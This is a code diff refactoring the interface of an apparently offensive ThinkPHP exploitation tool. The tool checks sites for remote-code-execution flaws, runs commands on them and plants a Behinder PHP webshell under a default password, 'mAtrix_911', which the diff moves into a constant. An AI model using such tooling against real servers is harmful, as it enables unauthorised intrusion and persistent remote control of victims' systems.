@@ -4,6 +4,7 @@ import 'package:crypto/crypto.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart' show rootBundle, Clipboard, ClipboardData;
 
+import '../app/constants.dart';
 import '../database/database_helper.dart';
 import '../exp/thinkphp/thinkphp_exp_service.dart';
 import '../models/project.dart';
@@ -124,7 +125,9 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
   final _urlController = TextEditingController();
   final _cmdController = TextEditingController();
   final _timeoutController = TextEditingController();
-  final _passwordController = TextEditingController(text: 'mAtrix_911');
+  final _passwordController = TextEditingController(
+    text: AppConstants.defaultShellPassword,
+  );
   final _logScrollController = ScrollController();
 
   String _log = '';
@@ -139,7 +142,7 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     setState(() {
       final existing = _log.isEmpty ? <String>[] : _log.split('\n');
       existing.add(line);
-      const maxLines = 500;
+      const maxLines = AppConstants.logBufferSize;
       final trimmed =
           existing.length > maxLines ? existing.sublist(existing.length - maxLines) : existing;
       _log = trimmed.join('\n');
@@ -166,7 +169,10 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     try {
       final svc = ThinkphpExpService(
         url: url,
-        timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 10),
+        timeout: Duration(
+          seconds: int.tryParse(_timeoutController.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
+        ),
       );
       final r = await svc.checkSingle(type);
       if (r.vulnerable) {
@@ -202,7 +208,10 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     try {
       final svc = ThinkphpExpService(
         url: url,
-        timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 10),
+        timeout: Duration(
+          seconds: int.tryParse(_timeoutController.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
+        ),
       );
       const rceTypes = [
         ThinkphpVulnType.tp50,
@@ -254,7 +263,10 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     try {
       final svc = ThinkphpExpService(
         url: url,
-        timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 10),
+        timeout: Duration(
+          seconds: int.tryParse(_timeoutController.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
+        ),
       );
       final results = await svc.checkAll();
       final found = <ThinkphpVulnType>[];
@@ -301,7 +313,10 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     try {
       final svc = ThinkphpExpService(
         url: url,
-        timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 10),
+        timeout: Duration(
+          seconds: int.tryParse(_timeoutController.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
+        ),
       );
       final out = await svc.exeRce(vuln, cmd);
       if (out != null && out.isNotEmpty) {
@@ -330,13 +345,18 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
     setState(() => _running = true);
     _appendLog('[*] 尝试 GetShell ($vuln.label)...');
     try {
-      final password = _passwordController.text.trim().isEmpty ? 'mAtrix_911' : _passwordController.text.trim();
+      final password = _passwordController.text.trim().isEmpty
+          ? AppConstants.defaultShellPassword
+          : _passwordController.text.trim();
       var shellContent = await rootBundle.loadString('assets/defaults/payloads/php_behinder.php');
       final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
       shellContent = shellContent.replaceFirst(RegExp(r'\$key="[0-9a-f]{16}"'), '\$key="$key"');
       final svc = ThinkphpExpService(
         url: url,
-        timeout: Duration(seconds: int.tryParse(_timeoutController.text.trim()) ?? 10),
+        timeout: Duration(
+          seconds: int.tryParse(_timeoutController.text.trim()) ??
+              AppConstants.defaultHttpTimeoutSeconds,
+        ),
       );
       final shellUrl = await svc.getShell(vuln, shellContent, password: password);
       if (shellUrl != null) {
@@ -355,7 +375,7 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
   /// 解析 GetShell 结果并跳转到 Webshell 交互页
   Future<void> _openWebshellFromResult(BuildContext context, String shellUrl) async {
     String url = shellUrl;
-    String password = 'mAtrix_911';
+    String password = AppConstants.defaultShellPassword;
     final passIdx = shellUrl.indexOf(' Pass:');
     if (passIdx > 0) {
       url = shellUrl.substring(0, passIdx).trim();
@@ -566,7 +586,7 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
                         TextField(
                           controller: _urlController,
                           style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
-                          decoration: _inputDecoration('目标 URL', 'https://target.com/'),
+                          decoration: _inputDecoration('目标 URL', 'http://localhost:8080'),
                         ),
                         const SizedBox(height: 8),
                         Row(
@@ -585,7 +605,10 @@ class _ThinkphpExpCardState extends State<_ThinkphpExpCard> {
                         TextField(
                           controller: _passwordController,
                           style: AppTextStyles.body(size: 12, color: AppColors.textPrimary),
-                          decoration: _inputDecoration('GetShell 密码', 'mAtrix_911'),
+                          decoration: _inputDecoration(
+                            'GetShell 密码',
+                            AppConstants.defaultShellPassword,
+                          ),
                         ),
                         const SizedBox(height: 16),
                         _sectionTitle('漏洞检测'),
